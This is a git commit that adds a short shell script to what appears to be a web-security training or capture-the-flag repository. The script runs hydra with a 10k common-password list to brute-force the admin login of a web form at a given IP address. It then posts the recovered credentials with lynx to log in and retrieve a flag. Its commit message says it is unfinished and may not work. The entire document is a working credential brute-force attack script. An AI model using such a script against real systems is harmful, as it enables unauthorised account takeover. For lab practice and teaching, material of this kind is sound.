366d0915a8962e38f01c576d2cfd5dcddfddfdf1
antonimalinowski <antonimalinowski.kontakt@gmail.com>
2023-04-22 11:41:25 +0200

    Add shell script that finds admin password using hydra and logs into the admin account with his credentials returning the secret flag, TO BE DONE - REVIEW AND FIX IF NOT WORKING PROPERLY'

---
+++ materials_and_solutions/web_modules/user_authentication/get_admin_password.sh
@@ -0,0 +1,5 @@
+﻿ip_address=$1
+hydra $ip_address -s 80 -l admin -P 10k-most-common.txt -t 64 -T 64 http-post-form '/:username=^USER^&password=^PASS^&submit=Submit:failed' | grep ': [a-z]' | cut -c 66- > a.txt
+password=$(cat a.txt | tr -d '\n')
+echo 'username=admin&password='$password | lynx $ip_address -post_data
+rm a.txt
